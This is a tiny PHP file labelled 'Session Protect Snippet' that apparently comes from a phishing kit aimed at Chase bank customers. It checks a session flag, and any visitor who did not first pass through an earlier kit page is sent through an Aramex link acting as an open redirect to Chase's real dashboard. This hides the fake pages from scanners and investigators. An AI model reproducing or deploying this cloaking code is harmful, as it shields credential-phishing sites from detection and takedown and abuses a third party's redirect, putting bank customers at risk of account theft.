<?php
# Session Protect Snippet
session_start();
if(!isset($_SESSION['page_a_visited'])){
        header("Location: https://www.aramex.com/ec/link.aspx?c=3388&r=486310&t=https://secure01b.chase.com/web/auth/dashboard#/dashboard/index/index");
		die();
}
?>